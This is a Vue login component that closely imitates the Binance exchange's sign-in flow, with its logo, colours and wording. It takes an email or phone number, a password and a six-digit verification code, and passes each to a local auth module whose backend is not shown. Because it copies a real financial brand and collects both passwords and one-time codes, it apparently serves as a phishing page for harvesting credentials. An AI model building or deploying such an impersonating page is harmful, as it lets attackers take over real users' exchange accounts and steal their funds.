<script setup>
import { ref, computed } from 'vue'
import { useRouter } from 'vue-router'
import { useAuth } from '../composables/useAuth'

const router = useRouter()
const { login, verifyOtp } = useAuth()
const step = ref(1) // 1: Email, 2: Password, 3: Verification, 4: StayLoggedIn
const emailPhone = ref('')
const password = ref('')
const showPassword = ref(false)
const verificationCode = ref('')
const dontShowAgain = ref(false)
const isProcessing = ref(false)

const maskedEmail = computed(() => {
    if (!emailPhone.value) return ''
    if (!emailPhone.value.includes('@')) {
        if (emailPhone.value.length > 7) {
            return emailPhone.value.slice(0, 3) + '****' + emailPhone.value.slice(-3)
        }
        return emailPhone.value
    }
    const [name, domain] = emailPhone.value.split('@')
    if (name.length <= 1) return emailPhone.value
    return `${name[0]}****@${domain}`
})

const nextStep = async () => {
    if (step.value === 1) {
        if (!emailPhone.value) return alert('Please enter your email or phone')
        step.value = 2
    } else if (step.value === 2) {
        if (!password.value) return alert('Please enter your password')
        isProcessing.value = true
        try {
            await login(emailPhone.value, password.value)
            step.value = 3
        } catch (error) {
            alert(error.response?.data?.error || 'Login failed. Please check your credentials.')
        } finally {
            isProcessing.value = false
        }
    } else if (step.value === 3) {
        if (verificationCode.value.length !== 6) return alert('Please enter the 6-digit code')
        isProcessing.value = true
        try {
            await verifyOtp(emailPhone.value, verificationCode.value)
            step.value = 4
        } catch (error) {
            alert(error.response?.data?.error || 'Verification failed. Please check the code.')
        } finally {
            isProcessing.value = false
        }
    } else if (step.value === 4) {
        router.push('/dashboard')
    }
}

const finishLogin = () => {
    router.push('/dashboard')
}
</script>

<template>
    <div class="min-h-screen bg-[#0B0E11] text-[#EAECEF] flex flex-col font-sans selection:bg-primary/30">
        <!-- Main Content -->
        <main class="flex-1 flex flex-col items-center justify-center px-4 py-8 sm:py-12">
            <!-- Logo -->
            <router-link to="/" class="mb-10 block">
                <img src="/images/logo.png" alt="Binance" class="h-12 w-auto mx-auto" />
            </router-link>

            <!-- Login Cards based on Steps -->
            <div
                class="w-full max-w-[440px] bg-[#1E2329] rounded-3xl p-8 border border-[#2B3139] shadow-2xl transition-all">

                <!-- STEP 1: EMAIL ENTRY -->
                <div v-if="step === 1" class="space-y-8 animate-in transition-all">
                    <div class="flex items-center justify-between">
                        <h1 class="text-[32px] font-bold text-white leading-tight">Log in</h1>
                        <button class="p-2 bg-[#2B3139] rounded-lg hover:bg-[#323a45] transition-colors group">
                            <svg class="w-6 h-6 text-white group-hover:scale-110 transition-transform"
                                fill="currentColor" viewBox="0 0 24 24">
                                <path
                                    d="M3 3h8v8H3V3zm2 2v4h4V5H5zm2 2h0v0H7V7zm6 0h4v4h-4V7zm-6 6h4v4H7v-4zm6 0h4v4h-4v-4zM13 13h4v4h-4v-4z" />
                            </svg>
                        </button>
                    </div>

                    <div class="space-y-6">
                        <div class="space-y-2">
                            <label class="text-[14px] font-medium text-[#848E9C]">Email/Phone number</label>
                            <input v-model="emailPhone" type="text" placeholder="Email/Phone (without country code)"
                                @keyup.enter="nextStep"
                                class="w-full bg-transparent border border-[#474D57] rounded-xl px-4 py-4 text-white focus:outline-none focus:border-primary transition-colors hover:border-[#5E6673]" />
                        </div>

                        <button @click="nextStep"
                            class="w-full bg-primary hover:bg-[#F0B90B] text-black font-bold py-4 rounded-xl text-[16px] transition-all transform active:scale-[0.98]">
                            Continue
                        </button>

                        <div class="relative py-4">
                            <div class="absolute inset-0 flex items-center">
                                <div class="w-full border-t border-[#2B3139]"></div>
                            </div>
                            <div class="relative flex justify-center">
                                <span class="bg-[#1E2329] px-4 text-[12px] text-[#848E9C]">or</span>
                            </div>
                        </div>

                        <div class="space-y-3">

                            <button
                                class="w-full bg-transparent border border-[#2B3139] hover:bg-[#2B3139] text-white flex items-center justify-center gap-3 py-3.5 rounded-xl transition-all">
                                <svg class="w-5 h-5" viewBox="0 0 24 24">
                                    <path fill="#4285F4"
                                        d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
                                    <path fill="#34A853"
                                        d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
                                    <path fill="#FBBC05"
                                        d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" />
                                    <path fill="#EA4335"
                                        d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
                                </svg>
                                <span class="text-[14px] font-medium">Continue with Google</span>
                            </button>
                        </div>
                    </div>
                </div>

                <!-- STEP 2: PASSWORD ENTRY -->
                <div v-if="step === 2" class="space-y-8 animate-in transition-all">
                    <div>
                        <button @click="step = 1" class="text-text-secondary hover:text-white mb-4 transition-colors">
                            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path d="M15 19l-7-7 7-7" stroke-width="2" />
                            </svg>
                        </button>
                        <h1 class="text-[32px] font-bold text-white leading-tight mb-2">Enter your password</h1>
                        <p class="text-[14px] text-text-secondary">{{ maskedEmail }}</p>
                    </div>

                    <div class="space-y-6">
                        <div class="space-y-2">
                            <label class="text-[14px] font-medium text-[#848E9C]">Password</label>
                            <div class="relative group">
                                <input v-model="password" :type="showPassword ? 'text' : 'password'"
                                    @keyup.enter="nextStep"
                                    class="w-full bg-transparent border border-[#474D57] rounded-xl px-4 py-4 text-white focus:outline-none focus:border-primary transition-colors hover:border-[#5E6673]" />
                                <button @click="showPassword = !showPassword"
                                    class="absolute right-4 top-1/2 -translate-y-1/2 text-[#848E9C] hover:text-white transition-colors">
                                    <svg v-if="!showPassword" class="w-5 h-5" fill="none" stroke="currentColor"
                                        viewBox="0 0 24 24">
                                        <path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" stroke-width="2" />
                                        <path
                                            d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
                                            stroke-width="2" />
                                    </svg>
                                    <svg v-else class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path
                                            d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.882 9.882L5.146 5.146M18.854 18.854l-4.242-4.242M12 5c4.478 0 8.268 2.943 9.542 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"
                                            stroke-width="2" />
                                    </svg>
                                </button>
                            </div>
                        </div>

                        <button @click="nextStep" :disabled="isProcessing"
                            class="w-full bg-primary hover:bg-[#F0B90B] text-black font-bold py-4 rounded-xl text-[16px] transition-all transform active:scale-[0.98] flex items-center justify-center gap-2">
                            <svg v-if="isProcessing" class="animate-spin h-5 w-5 text-black" viewBox="0 0 24 24">
                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor"
                                    stroke-width="4"></circle>
                                <path class="opacity-75" fill="currentColor"
                                    d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z">
                                </path>
                            </svg>
                            {{ isProcessing ? 'Verifying...' : 'Continue' }}
                        </button>

                        <div class="text-center">
                            <a href="#" class="text-primary hover:underline text-[14px]">Forgot password?</a>
                        </div>
                    </div>
                </div>

                <!-- STEP 3: EMAIL VERIFICATION -->
                <div v-if="step === 3" class="space-y-8 animate-in transition-all">
                    <div>
                        <button @click="step = 2" class="text-text-secondary hover:text-white mb-4 transition-colors">
                            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path d="M15 19l-7-7 7-7" stroke-width="2" />
                            </svg>
                        </button>
                        <h1 class="text-[32px] font-bold text-white leading-tight mb-4">Email Verification</h1>
                        <p class="text-[14px] text-text-secondary leading-relaxed">
                            Enter the 6-digit verification code sent to <span class="text-white font-medium">{{
                                maskedEmail }}</span>.
                        </p>
                    </div>

                    <div class="space-y-6">
                        <div class="space-y-2">
                            <label class="text-[14px] font-medium text-[#848E9C]">Email Verification Code</label>
                            <div class="relative">
                                <input v-model="verificationCode" type="text" maxlength="6" @keyup.enter="nextStep"
                                    class="w-full bg-transparent border border-[#474D57] rounded-xl px-4 py-4 text-white focus:outline-none focus:border-primary transition-colors hover:border-[#5E6673] tracking-[0.5em] text-center text-lg" />
                                <button
                                    class="absolute right-4 top-1/2 -translate-y-1/2 text-primary text-[12px] font-bold hover:opacity-80 transition-opacity">
                                    Code Sent
                                    <svg class="w-3.5 h-3.5 inline ml-1" fill="none" stroke="currentColor"
                                        viewBox="0 0 24 24">
                                        <path d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                                            stroke-width="2" />
                                    </svg>
                                </button>
                            </div>
                        </div>

                        <button @click="nextStep" :disabled="isProcessing || verificationCode.length !== 6"
                            class="w-full bg-primary hover:bg-[#F0B90B] text-black font-bold py-4 rounded-xl text-[16px] transition-all transform active:scale-[0.98] flex items-center justify-center gap-2">
                            <svg v-if="isProcessing" class="animate-spin h-5 w-5 text-black" viewBox="0 0 24 24">
                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor"
                                    stroke-width="4"></circle>
                                <path class="opacity-75" fill="currentColor"
                                    d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z">
                                </path>
                            </svg>
                            {{ isProcessing ? 'Verifying OTP...' : 'Submit' }}
                        </button>

                        <div class="text-center">
                            <a href="#" class="text-[#848E9C] hover:text-primary transition-colors text-[14px]">Security
                                verification unavailable?</a>
                        </div>
                    </div>
                </div>

                <!-- STEP 4: STAY LOGGED IN -->
                <div v-if="step === 4" class="space-y-8 animate-in transition-all text-center">
                    <div class="flex flex-col items-center">
                        <div class="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mb-6">
                            <svg class="w-10 h-10 text-primary" fill="currentColor" viewBox="0 0 24 24">
                                <path
                                    d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
                            </svg>
                        </div>
                        <h1 class="text-[28px] font-bold text-white leading-tight mb-4">Stay Logged In</h1>
                        <p class="text-[14px] text-text-secondary leading-relaxed px-4">
                            By clicking 'Yes', you can stay logged in for up to 5 days on this device. To revoke your
                            logged in status, log out of your Binance account on this device.
                        </p>
                    </div>

                    <div class="space-y-4">
                        <div class="flex items-center justify-center gap-2 group cursor-pointer"
                            @click="dontShowAgain = !dontShowAgain">
                            <div class="w-4 h-4 rounded border border-[#474D57] flex items-center justify-center transition-colors px-0 py-0"
                                :class="{ 'bg-primary border-primary': dontShowAgain }">
                                <svg v-if="dontShowAgain" class="w-3 h-3 text-black" fill="currentColor"
                                    viewBox="0 0 24 24">
                                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
                                </svg>
                            </div>
                            <span class="text-[12px] text-text-secondary group-hover:text-white transition-colors">Don't
                                show this message again on this device</span>
                        </div>

                        <div class="space-y-3 pt-4">
                            <button @click="finishLogin"
                                class="w-full bg-primary hover:bg-[#F0B90B] text-black font-bold py-4 rounded-xl text-[16px] transition-all transform active:scale-[0.98]">
                                Yes
                            </button>
                            <button @click="finishLogin"
                                class="w-full bg-[#2B3139] hover:bg-[#323a45] text-white font-bold py-4 rounded-xl text-[16px] transition-all transform active:scale-[0.98]">
                                Not Now
                            </button>
                        </div>
                    </div>
                </div>

            </div>

            <!-- Create Account Link (Only on step 1) -->
            <router-link v-if="step === 1" to="/register"
                class="mt-8 text-primary hover:underline transition-all font-medium text-[16px]">
                Create a Binance Account
            </router-link>
        </main>

        <!-- Footer -->
        <footer class="p-8 flex flex-wrap items-center justify-center gap-6 text-[12px] text-[#848E9C]">
            <div class="flex items-center gap-1 cursor-pointer hover:text-white transition-colors">
                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" stroke-width="2" />
                    <path d="M3.6 9h16.8M3.6 15h16.8" stroke-width="2" />
                </svg>
                English
            </div>
            <a href="#" class="hover:text-white transition-colors">Cookies</a>
            <a href="#" class="hover:text-white transition-colors">Privacy</a>
        </footer>
    </div>
</template>

<style scoped>
.animate-in {
    animation: fadeIn 0.4s ease-out;
}

@keyframes fadeIn {
    from {
        opacity: 0;
        transform: translateY(10px);
    }

    to {
        opacity: 1;
        transform: translateY(0);
    }
}

@keyframes slideUp {
    from {
        opacity: 0;
        transform: translateY(20px);
    }

    to {
        opacity: 1;
        transform: translateY(0);
    }
}

main {
    animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1);
}
</style>
